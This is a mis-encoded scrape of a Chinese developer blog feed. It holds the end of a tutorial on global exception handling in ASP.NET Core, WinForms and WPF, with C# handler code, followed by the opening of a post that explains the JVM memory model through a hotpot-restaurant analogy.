<table><thead><tr><th>æ¡†æ¶</th><th>è¿è¡Œæ¨¡å¼</th><th>å¼‚å¸¸å¤„ç†</th><th>ç»“æœ</th></tr></thead><tbody><tr><td><strong>ASP.NET Core</strong></td><td>æœåŠ¡å™¨è¿›ç¨‹ï¼ˆWeb API åç«¯ï¼‰</td><td>âœ… æ¡†æ¶å†…ç½®å¼‚å¸¸æ•è·</td><td>å¼‚å¸¸ä¸å¯¼è‡´è¿›ç¨‹å´©æºƒ</td></tr><tr><td><strong>WinForms</strong></td><td>æ¡Œé¢åº”ç”¨ï¼ˆå•ä¸ªè¿›ç¨‹ï¼‰</td><td>âŒ æ²¡æœ‰å†…ç½®å¼‚å¸¸æ•è·</td><td>ä¸»çº¿ç¨‹å¼‚å¸¸ â†’ UI å†»ç»“/å´©æºƒ</td></tr><tr><td><strong>WPF</strong></td><td>æ¡Œé¢åº”ç”¨ï¼ˆå•ä¸ªè¿›ç¨‹ï¼‰</td><td>âŒ æ²¡æœ‰å†…ç½®å¼‚å¸¸æ•è·</td><td>ä¸»çº¿ç¨‹å¼‚å¸¸ â†’ UI å†»ç»“/å´©æºƒ</td></tr><tr><td><strong>Console</strong></td><td>æ§åˆ¶å°åº”ç”¨</td><td>âŒ æ²¡æœ‰å†…ç½®å¼‚å¸¸æ•è·</td><td>å¼‚å¸¸ â†’ åº”ç”¨ç›´æ¥é€€å‡º</td></tr></tbody></table>
<hr/>
<h4 data-id="heading-28">å…³é”®åŸå› </h4>
<h5 data-id="heading-29">1ï¸âƒ£ <strong>æœåŠ¡å™¨çš„å¿…è¦æ€§ï¼ˆä¸ºä»€ä¹ˆ ASP.NET Core å¿…é¡»å¤„ç†å¼‚å¸¸ï¼‰</strong></h5>
<pre><code class="hljs">ASP.NET Coreï¼š
  è¿›ç¨‹å¯åŠ¨ â†’ æŒç»­ç›‘å¬ â†’ æ¥æ”¶å¤šä¸ª HTTP è¯·æ±‚ â†’ éœ€è¦ 24/7 è¿è¡Œ

å¿…è¦æ¡ä»¶ï¼š
  âœ“ ä¸€ä¸ªè¯·æ±‚å‡ºé”™ï¼Œä¸èƒ½å½±å“å…¶ä»–è¯·æ±‚
  âœ“ ä¸€ä¸ªè¯·æ±‚å¼‚å¸¸ï¼Œä¸èƒ½å¯¼è‡´è¿›ç¨‹å´©æºƒ
  âœ“ å¿…é¡»æœ‰å¼‚å¸¸éš”ç¦»æœºåˆ¶
  
â†’ æ‰€ä»¥æ¡†æ¶å†…ç½®äº†å¼‚å¸¸æ•è·æœºåˆ¶
</code></pre>
<h5 data-id="heading-30">2ï¸âƒ£ <strong>è¯·æ±‚éš”ç¦»ï¼ˆASP.NET Core çš„æ ¸å¿ƒä¼˜åŠ¿ï¼‰</strong></h5>
<pre><code class="hljs language-vbscript" lang="vbscript"><span class="hljs-built_in">Request</span> <span class="hljs-number">1</span> â†’ å¼‚å¸¸ â†’ æ•è· â†’ è¿”å› <span class="hljs-number">500</span> âœ“
<span class="hljs-built_in">Request</span> <span class="hljs-number">2</span> â†’ æ­£å¸¸ â†’ è¿”å› <span class="hljs-number">200</span> âœ“
<span class="hljs-built_in">Request</span> <span class="hljs-number">3</span> â†’ å¼‚å¸¸ â†’ æ•è· â†’ è¿”å› <span class="hljs-number">500</span> âœ“

æ¯ä¸ªè¯·æ±‚ç‹¬ç«‹å¤„ç†ï¼Œäº’ä¸å½±å“ï¼
</code></pre>
<h5 data-id="heading-31">3ï¸âƒ£ <strong>WinForms/WPF/Console ä¸ºä»€ä¹ˆä¼šå´©æºƒ</strong></h5>
<pre><code class="hljs language-css" lang="css">WinForms å•çº¿ç¨‹æ¨¡å‹ï¼š
  <span class="hljs-selector-tag">Main</span>() çº¿ç¨‹ â†’ UI äº‹ä»¶å¤„ç† â†’ å¼‚å¸¸ â†’ çº¿ç¨‹åœæ­¢ â†’ åº”ç”¨å´©æºƒ

åŸå› ï¼š
  âŒ æ²¡æœ‰è¯·æ±‚éš”ç¦»ï¼ˆæ²¡æœ‰å¤šä¸ªè¯·æ±‚æ¦‚å¿µï¼‰
  âŒ UI çº¿ç¨‹å°±æ˜¯å”¯ä¸€çš„å¤„ç†çº¿ç¨‹
  âŒ æ¡†æ¶ä¸éœ€è¦ä¿è¯æœåŠ¡å¯ç”¨æ€§ï¼ˆæ¡Œé¢åº”ç”¨æ²¡æœ‰è¿™ä¸ªè¦æ±‚ï¼‰
</code></pre>
<hr/>
<h4 data-id="heading-32">Kestrel æœåŠ¡å™¨å±‚çš„å¼‚å¸¸å¤„ç†</h4>
<pre><code class="hljs language-css" lang="css">HTTP è¯·æ±‚åˆ°è¾¾
    â†“
Kestrelï¼ˆWeb æœåŠ¡å™¨ï¼‰â† æœ€åº•å±‚å¼‚å¸¸æ•è·ç‚¹
    â†“
ASP<span class="hljs-selector-class">.NET</span> Core Middleware Pipeline
    â†“
Your <span class="hljs-selector-tag">Code</span>ï¼ˆControllerã€Serviceï¼‰
    â†“
å¼‚å¸¸å‘ç”Ÿ â†’ é€å±‚å¾€ä¸ŠæŠ› â†’ Kestrel æ•è· â†’ è¿”å› <span class="hljs-number">500</span> â†’ è¿›ç¨‹ç»§ç»­è¿è¡Œ
</code></pre>
<p><strong>æ¡†æ¶é»˜è®¤åšçš„ï¼š</strong></p>
<ul>
<li>ä»»ä½•æœªå¤„ç†çš„å¼‚å¸¸éƒ½ä¼šè¢« Kestrel æ•è·</li>
<li>è¿”å› HTTP 500 é”™è¯¯å“åº”</li>
<li>è¿›ç¨‹ä¸ä¼šé€€å‡º</li>
</ul>
<hr/>
<h4 data-id="heading-33">æ¡†æ¶å†…ç½®å¼‚å¸¸å¤„ç†çš„é™åˆ¶ä¸è‡ªå®šä¹‰å…¨å±€å¼‚å¸¸ä¸­é—´ä»¶</h4>
<pre><code class="hljs language-vbscript" lang="vbscript">æ¡†æ¶èƒ½è‡ªåŠ¨å¤„ç†çš„å¼‚å¸¸ï¼š
âœ… æ•°æ®éªŒè¯å¤±è´¥       â†’ <span class="hljs-number">400</span> Bad <span class="hljs-built_in">Request</span>
âœ… æ¨¡å‹ç»‘å®šå¤±è´¥       â†’ <span class="hljs-number">400</span> Bad <span class="hljs-built_in">Request</span>
âœ… è·¯ç”±ä¸åŒ¹é…         â†’ <span class="hljs-number">404</span> <span class="hljs-keyword">Not</span> Found

æ¡†æ¶æ— æ³•ç»†è‡´å¤„ç†çš„å¼‚å¸¸ï¼š
âŒ ä¸šåŠ¡é€»è¾‘å¼‚å¸¸       â†’ éƒ½è¿”å› <span class="hljs-number">500</span>ï¼ˆä¸ç®¡ä»€ä¹ˆåŸå› ï¼‰
âŒ æ•°æ®åº“è¿æ¥å¤±è´¥     â†’ éƒ½è¿”å› <span class="hljs-number">500</span>
âŒ æƒé™ä¸è¶³å¼‚å¸¸       â†’ éƒ½è¿”å› <span class="hljs-number">500</span>ï¼ˆåº”è¯¥è¿”å› <span class="hljs-number">401</span>ï¼‰
âŒ èµ„æºä¸å­˜åœ¨         â†’ éƒ½è¿”å› <span class="hljs-number">500</span>ï¼ˆåº”è¯¥è¿”å› <span class="hljs-number">404</span>ï¼‰

æ‰€ä»¥éœ€è¦è‡ªå®šä¹‰å¼‚å¸¸å¤„ç†ä¸­é—´ä»¶æ¥åŒºåˆ†å¤„ç†
</code></pre>
<hr/>
<h4 data-id="heading-34">æ€»ç»“</h4>

























<table><thead><tr><th>ç‚¹</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td><strong>ä¸ºä»€ä¹ˆ ASP.NET Core ç¨³å®š</strong></td><td>æœåŠ¡å™¨æ¶æ„ + è¯·æ±‚éš”ç¦» + æ¡†æ¶å†…ç½®å¼‚å¸¸æ•è·</td></tr><tr><td><strong>ä¸ºä»€ä¹ˆ WinForms å®¹æ˜“å´©æºƒ</strong></td><td>æ¡Œé¢æ¶æ„ + å•çº¿ç¨‹ + æ¡†æ¶ä¸å¤„ç†å¼‚å¸¸</td></tr><tr><td><strong>æ¡†æ¶é»˜è®¤å¤„ç†</strong></td><td>åªæ˜¯"ä¿å‘½"ï¼Œé˜²æ­¢è¿›ç¨‹å´©æºƒï¼Œä½†è¿”å›å€¼éƒ½æ˜¯ 500</td></tr><tr><td><strong>éœ€è¦è‡ªå®šä¹‰ä¸­é—´ä»¶</strong></td><td>ä¸ºäº†åŒºåˆ†å¼‚å¸¸ã€è‡ªå®šä¹‰è¿”å›æ ¼å¼ã€è®°å½•æ—¥å¿—ã€æå‡ç”¨æˆ·ä½“éªŒ</td></tr></tbody></table>
<hr/>
<hr/>
<h3 data-id="heading-35">WinForms/WPF çš„å…¨å±€å¼‚å¸¸å¤„ç†</h3>
<blockquote>
<p>WinForms/WPFæ²¡æœ‰ä¸­é—´ä»¶æˆ–è€…å…¨å±€å¼‚å¸¸å¤„ç†å…œåº•,å› æ­¤éœ€è¦ä½¿ç”¨å…¶å®ƒçš„æ–¹å¼å¤„ç†å…¨å±€å¼‚å¸¸ä¿è¯ç¨‹åºç¨³å®š</p>
</blockquote>
<h4 data-id="heading-36">1 WinForms</h4>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-comment">// Program.cs</span>
<span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title">Program</span>
{
    [<span class="hljs-meta">STAThread</span>]
    <span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Main</span>()</span>
    {
        <span class="hljs-comment">// âœ… UI çº¿ç¨‹å¼‚å¸¸å¤„ç†</span>
        Application.ThreadException += Application_ThreadException;
        
        <span class="hljs-comment">// âœ… åå°çº¿ç¨‹å¼‚å¸¸å¤„ç†</span>
        AppDomain.CurrentDomain.UnhandledException += CurrentDomain_UnhandledException;
        
        ApplicationConfiguration.Initialize();
        Application.Run(<span class="hljs-keyword">new</span> Form1());
    }
    
    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Application_ThreadException</span>(<span class="hljs-params">
        <span class="hljs-built_in">object</span> sender, 
        System.Threading.ThreadExceptionEventArgs e</span>)</span>
    {
        Exception ex = e.Exception;
        
        <span class="hljs-comment">// âœ… æ‹¦æˆªå¼‚å¸¸</span>
        MessageBox.Show(
            <span class="hljs-string">$"å‘ç”Ÿé”™è¯¯: <span class="hljs-subst">{ex.Message}</span>"</span>,
            <span class="hljs-string">"å¼‚å¸¸"</span>,
            MessageBoxButtons.OK,
            MessageBoxIcon.Error);
        
        _logger.LogError(ex, <span class="hljs-string">"åº”ç”¨å¼‚å¸¸"</span>);
        
        <span class="hljs-comment">// e. Handled = true è¡¨ç¤ºå¼‚å¸¸è¢«å¤„ç†ï¼Œç¨‹åºç»§ç»­è¿è¡Œ</span>
        e. Handled = <span class="hljs-literal">true</span>;
    }
    
    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">CurrentDomain_UnhandledException</span>(<span class="hljs-params">
        <span class="hljs-built_in">object</span> sender, 
        UnhandledExceptionEventArgs e</span>)</span>
    {
        Exception ex = (Exception)e.ExceptionObject;
        
        MessageBox.Show(
            <span class="hljs-string">$"ä¸¥é‡é”™è¯¯: <span class="hljs-subst">{ex.Message}</span>"</span>,
            <span class="hljs-string">"ä¸¥é‡é”™è¯¯"</span>,
            MessageBoxButtons.OK,
            MessageBoxIcon.Error);
        
        <span class="hljs-comment">// è¿™é‡Œæ— æ³•é€šè¿‡ e. Handled æ¥ä¿ç•™ç¨‹åºç»§ç»­è¿è¡Œ</span>
        <span class="hljs-comment">// é€šå¸¸ä¼šå¯¼è‡´ç¨‹åºé€€å‡º</span>
    }
}

<span class="hljs-comment">// Form1.cs</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">partial</span> <span class="hljs-keyword">class</span> <span class="hljs-title">Form1</span> : <span class="hljs-title">Form</span>
{
    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">button_Click</span>(<span class="hljs-params"><span class="hljs-built_in">object</span> sender, EventArgs e</span>)</span>
    {
        <span class="hljs-keyword">try</span>
        {
            <span class="hljs-built_in">int</span> result = <span class="hljs-number">10</span> / <span class="hljs-number">0</span>;
            MessageBox.Show(result.ToString());
        }
        <span class="hljs-keyword">catch</span> (Exception ex)
        {
            MessageBox.Show(<span class="hljs-string">$"é”™è¯¯:  <span class="hljs-subst">{ex.Message}</span>"</span>);
        }
    }
}
</code></pre>
<h4 data-id="heading-37">2 WPF</h4>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-comment">// App.xaml. cs</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">partial</span> <span class="hljs-keyword">class</span> <span class="hljs-title">App</span> : <span class="hljs-title">Application</span>
{
    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">override</span> <span class="hljs-keyword">void</span> <span class="hljs-title">OnStartup</span>(<span class="hljs-params">StartupEventArgs e</span>)</span>
    {
        <span class="hljs-keyword">base</span>.OnStartup(e);
        
        <span class="hljs-comment">// âœ… UI çº¿ç¨‹å¼‚å¸¸å¤„ç†</span>
        <span class="hljs-keyword">this</span>. DispatcherUnhandledException += App_DispatcherUnhandledException;
        
        <span class="hljs-comment">// âœ… åå°çº¿ç¨‹å¼‚å¸¸å¤„ç†</span>
        AppDomain.CurrentDomain.UnhandledException += 
            CurrentDomain_UnhandledException;
    }
    
    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">App_DispatcherUnhandledException</span>(<span class="hljs-params">
        <span class="hljs-built_in">object</span> sender, 
        System.Windows.Threading.DispatcherUnhandledExceptionEventArgs e</span>)</span>
    {
        Exception ex = e.Exception;
        
        MessageBox.Show(
            <span class="hljs-string">$"åº”ç”¨ç¨‹åºé”™è¯¯: <span class="hljs-subst">{ex.Message}</span>"</span>,
            <span class="hljs-string">"é”™è¯¯"</span>,
            MessageBoxButton.OK,
            MessageBoxImage.Error);
        
        <span class="hljs-comment">// e.Handled = true è¡¨ç¤ºå¼‚å¸¸è¢«å¤„ç†ï¼Œç¨‹åºç»§ç»­è¿è¡Œ</span>
        e. Handled = <span class="hljs-literal">true</span>;
    }
    
    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">CurrentDomain_UnhandledException</span>(<span class="hljs-params">
        <span class="hljs-built_in">object</span> sender, 
        UnhandledExceptionEventArgs e</span>)</span>
    {
        Exception ex = (Exception)e.ExceptionObject;
        
        MessageBox. Show(
            <span class="hljs-string">$"ä¸¥é‡é”™è¯¯: <span class="hljs-subst">{ex.Message}</span>"</span>,
            <span class="hljs-string">"ä¸¥é‡é”™è¯¯"</span>,
            MessageBoxButton.OK,
            MessageBoxImage.Error);
    }
}
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ğŸ² å›¾è§£ JVM å†…å­˜æ¨¡å‹ï¼šåˆ«èƒŒå…«è‚¡æ–‡äº†ï¼Œç›´æ¥è¿›â€œRe-Zero ç«é”…åº—â€å¹²é¥­ï¼]]></title>    <link>https://juejin.cn/post/7595040803581231119</link>    <guid>https://juejin.cn/post/7595040803581231119</guid>    <pubDate>2026-01-14T15:36:51.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7595040803581231119" data-draft-id="7594851429163188258" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ğŸ² å›¾è§£ JVM å†…å­˜æ¨¡å‹ï¼šåˆ«èƒŒå…«è‚¡æ–‡äº†ï¼Œç›´æ¥è¿›â€œRe-Zero ç«é”…åº—â€å¹²é¥­ï¼"/> <meta itemprop="keywords" content="Java,JVM"/> <meta itemprop="datePublished" content="2026-01-14T15:36:51.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Re_zero"/> <meta itemprop="url" content="https://juejin.cn/user/2965821818672144"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ğŸ² å›¾è§£ JVM å†…å­˜æ¨¡å‹ï¼šåˆ«èƒŒå…«è‚¡æ–‡äº†ï¼Œç›´æ¥è¿›â€œRe-Zero ç«é”…åº—â€å¹²é¥­ï¼
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2965821818672144/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Re_zero
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-14T15:36:51.000Z" title="Wed Jan 14 2026 15:36:51 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-14
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»6åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>#Java #JVM #é¢è¯• #åº•å±‚åŸç†</p>
<blockquote>
<p><strong>åæ§½</strong>ï¼šJVM å†…å­˜æ¨¡å‹é‚£å †ç ´æ¦‚å¿µï¼ŒèƒŒäº†å¿˜ï¼Œå¿˜äº†èƒŒï¼Œé¢è¯•ä¸€ç´§å¼ å°±æŠŠâ€œå †â€å’Œâ€œæ ˆâ€è¯´åï¼Ÿ<br/>
<strong>çœŸç›¸</strong>ï¼šå…¶å®æ ¹æœ¬ä¸ç”¨æ­»è®°ç¡¬èƒŒã€‚ä»Šå¤©ä¸è®²äººè¯ï¼Œæˆ‘ä»¬ç›´æ¥å¼€ä¸€å®¶ç«é”…åº—ï¼Œè¾¹åƒè¾¹èŠã€‚</p>
</blockquote>
<p><code>ğŸ’¡ æç¤ºï¼šæ–‡ä¸­åŒ…å«å­—ç¬¦ç”»å›¾è§£ï¼Œæ‰‹æœºç«¯å¦‚æœæ˜¾ç¤ºé”™ä½ï¼Œå»ºè®®æ¨ªå±æˆ–åœ¨ PC ç«¯è§‚çœ‹æ•ˆæœæœ€ä½³ã€‚</code></p>
<p>å“ˆå–½ï¼Œæˆ‘æ˜¯Â <strong>Re-Zero</strong>ã€‚</p>
<p>é¢è¯•å®˜é—®ä½  JVM å†…å­˜ç»“æ„ï¼Œä½ è¦æ˜¯åªä¼šè¯´â€œå †æ˜¯å…±äº«çš„ï¼Œæ ˆæ˜¯ç§æœ‰çš„â€ï¼Œå¤§æ¦‚ç‡ä¹Ÿå°±æ˜¯ä¸ªåŠæ ¼åˆ†ã€‚</p>
<p>å’±æ¢ä¸ªæ€è·¯ï¼š<strong>JVM æ ¹æœ¬å°±æ˜¯ä¸€å®¶ç”Ÿæ„ç«çˆ†çš„ç«é”…åº—ï¼</strong>Â èœå“æ˜¯å¯¹è±¡ï¼ŒæœåŠ¡å‘˜æ˜¯çº¿ç¨‹ï¼Œåå¨æ˜¯åƒåœ¾å›æ”¶ã€‚</p>
<p>æ¥ï¼Œæ‹¿å¥½ç­·å­ï¼Œè¿›åº—äº†ï¼ğŸ¥¢</p>
<hr/>
<h2 data-id="heading-0">ğŸ—ºï¸ å…ˆçœ‹ä¸€çœ¼â€œåå¨åœ°å›¾â€</h2>
<p>åˆ«è¢«ä»€ä¹ˆÂ <code>Runtime Data Area</code>Â è¿™ç§æ´‹æ–‡å“åˆ°ï¼Œç›´æ¥çœ‹è¿™å¼ å›¾ï¼Œè¿™å°±æ˜¯ JVM çš„å…¨æ™¯è½åœ°çª—ï¼š</p>
<pre><code class="hljs language-Plaintext" lang="Plaintext">+---------------------------- JVM å†…å­˜åŒºåŸŸ -----------------------------+
|                                                                     |
|  +========================+         +============================+  |
|  |    çº¿ç¨‹ç§æœ‰ (Private)    |         |      çº¿ç¨‹å…±äº« (Shared)       |  |
|  | (æ¯ä¸ªæœåŠ¡å‘˜æ‰‹é‡Œçš„æ‰˜ç›˜/æœ¬å­)|         |      (é¤å…çš„å¤§å ‚å’Œåå¨)      |  |
|  +========================+         +============================+  |
|  |                        |         |                            |  |
|  |  1. ç¨‹åºè®¡æ•°å™¨ (PC)     |         |    4. æ–¹æ³•åŒº (Method Area)  |  |
|  |    [ è®°å½•æ‰§è¡Œè¡Œå· ]     |         |       [ èœå•ã€ç§˜æ–¹ã€åº—å ]       |  |
|  |                        |         |                            |  |
|  |  2. è™šæ‹Ÿæœºæ ˆ (Stack)    |         |    5. å † (Heap)            |  |
|  |    [ å±€éƒ¨å˜é‡ã€å¼•ç”¨ ]   |         |       [ æ‘†æ»¡èœçš„å¤§åœ†æ¡Œ ]     |  |
|  |                        |         |                            |  |
|  |  3. æœ¬åœ°æ–¹æ³•æ ˆ (Native) |         |                            |  |
|  |    [ C++ å¤–è˜å¨æˆ¿ ]     |         |                            |  |
|  +------------------------+         +----------------------------+  |
|                                                                     |
+---------------------------------------------------------------------+
</code></pre>
<p>çœ‹ä¸æ‡‚ï¼Ÿæ²¡äº‹ï¼Œå’±ä»¬çš„ç«é”…åº—é©¬ä¸Šå¼€å¼ ï¼Œä½ é©¬ä¸Šå°±æ‡‚äº†ï¼</p>
<hr/>
<h2 data-id="heading-1">ğŸª æ ¸å¿ƒåŒºå®æˆ˜ï¼šè¿™åœ°å„¿åˆ°åº•æ˜¯å¹²å˜›çš„ï¼Ÿ</h2>
<h3 data-id="heading-2">1. æ–¹æ³•åŒº (Method Area) â€”â€” å¢™ä¸Šçš„èœå•ä¸ç¥–ä¼ ç§˜æ–¹ ğŸ¥˜</h3>
<ul>
<li><strong>è°èƒ½è¿›</strong>ï¼šå…¨åº—å…±äº«ï¼Œå°±ä¸€ä»½ã€‚(çº¿ç¨‹å…±äº«ï¼Œåªæœ‰ä¸€ä»½)</li>
<li><strong>å’‹å›äº‹</strong>ï¼š<br/>
è¿™å°±æ˜¯è´´åœ¨å¢™ä¸Šçš„<strong>èœå•</strong>å’Œ<strong>é…æ–¹</strong>ã€‚<br/>
åº—é‡Œå–å•¥èœï¼ˆç±»ä¿¡æ¯ï¼‰ã€æ¯›è‚šçƒ«å‡ ç§’ï¼ˆæ–¹æ³•ä»£ç ï¼‰ã€åº—åå«å•¥ï¼ˆé™æ€å˜é‡Â <code>static</code>ï¼‰ï¼Œå…¨åœ¨è¿™å„¿æŒ‚ç€ã€‚<br/>
åªè¦åº—å¼€ç€ï¼Œè¿™ç©æ„å„¿å°±ä¸èƒ½åŠ¨ï¼Œè°æ¥éƒ½çœ‹è¿™ä¸€ä»½ã€‚</li>
<li><strong>å°çŸ¥è¯†</strong>ï¼šJDK8 ä¹‹åï¼Œè¿™é‡Œæ”¹å«"å…ƒç©ºé—´"ï¼Œä¸å†å ç”¨å †å†…å­˜ï¼Œè€Œæ˜¯ç”¨æœ¬åœ°å†…å­˜ã€‚</li>
</ul>
<h3 data-id="heading-3">2. å † (Heap) â€”â€” æ°¸è¿œåœ¨åŠ èœçš„å¤§åœ†æ¡Œ ğŸ–</h3>
<ul>
<li><strong>è°èƒ½è¿›</strong>ï¼šå…¨åº—å…±äº«ï¼Œæœ€å åœ°å„¿ã€‚(çº¿ç¨‹å…±äº«ï¼Œå†…å­˜å ç”¨æœ€å¤§)</li>
<li><strong>å’‹å›äº‹</strong>ï¼š<br/>
è¿™å°±æ˜¯åº—ä¸­å¤®é‚£å¼ <strong>è¶…çº§å¤§åœ†æ¡Œ</strong>ï¼<br/>
å‡¡æ˜¯ä½ Â <code>new</code>Â å‡ºæ¥çš„è‚‰å•Šã€èœå•Šï¼ˆå¯¹è±¡å®ä¾‹ï¼‰ï¼Œå…¨å¾€è¿™å„¿å †ã€‚<br/>
æœåŠ¡å‘˜ï¼ˆçº¿ç¨‹ï¼‰éšä¾¿ä¸Šèœã€å®¢äººéšä¾¿å¤¹èœã€‚<br/>
